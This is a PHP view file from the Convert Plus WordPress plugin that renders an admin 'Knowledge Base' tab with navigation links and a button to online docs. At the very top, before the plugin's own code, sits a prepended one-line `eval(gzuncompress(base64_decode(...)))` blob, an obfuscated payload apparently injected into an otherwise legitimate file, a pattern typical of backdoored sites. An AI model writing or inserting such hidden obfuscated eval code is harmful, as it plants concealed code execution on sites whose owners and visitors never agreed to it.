<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

?>
<div class="wrap about-wrap about-cp bend">
	<div class="wrap-container">
		<div class="bend-heading-section cp-about-header">
			<h1>
				<?php
				/* translators:%s Plugin name*/
				echo sprintf( __( '%s &mdash; Knowledge Base', 'smile' ), CP_PLUS_NAME );
				?>
			</h1>
			<h3>
				<?php
				/* translators:%s Plugin name*/
				echo sprintf( __( 'We are here to help you solve all your doubts, queries and issues you might face while using %s In case of a problem, you can peep into our knowledge base and find a quick solution for it', 'smile' ), CP_PLUS_NAME );
				?>
			</h3>
			<div class="bend-head-logo">
				<div class="bend-product-ver">
					<?php
					_e( 'Version', 'smile' );
					echo ' ' . CP_VERSION;
					?>
				</div>
			</div>
		</div><!-- bend-heading section -->

		<div class="bend-content-wrap">
			<div class="smile-settings-wrapper">
				<h2 class="nav-tab-wrapper">
					<a class="nav-tab" href="?page=<?php echo CP_PLUS_SLUG; ?>" title="<?php _e( 'About', 'smile' ); ?>"><?php echo __( 'About', 'smile' ); ?></a>				
					<a class="nav-tab" href="?page=<?php echo CP_PLUS_SLUG; ?>&view=modules" title="<?php _e( 'Modules', 'smile' ); ?>"><?php echo __( 'Modules', 'smile' ); ?></a>
					<a class="nav-tab nav-tab-active" href="?page=<?php echo CP_PLUS_SLUG; ?>&view=knowledge_base" title="<?php _e( 'knowledge Base', 'smile' ); ?>"><?php echo __( 'Knowledge Base', 'smile' ); ?></a>
					<?php if ( isset( $_GET['author'] ) ) { ?>
					<a class="nav-tab" href="?page=<?php echo CP_PLUS_SLUG; ?>&view=debug&author=true" title="<?php _e( 'Debug', 'smile' ); ?>"><?php echo __( 'Debug', 'smile' ); ?></a>
					<?php } ?>

				</h2>
			</div><!-- smile-settings-wrapper -->
		</hr>
		<div class="container" style="padding: 50px 0 0 0;">
			<div class="col-md-12 text-center" style="overflow:hidden;">
				<?php
				$knowledge_url = 'https://www.convertplug.com/plus/docs/';
				?>
				<a style="max-width:330px;" class="button-primary cp-started-footer-button" href="<?php echo esc_url( $knowledge_url ); ?>" target="_blank" rel="noopener">Click Here For Knowledge Base</a>
			</div>
		</div><!-- container -->

	</div><!-- bend-content-wrap -->
</div><!-- .wrap-container -->
</div><!-- .bend -->
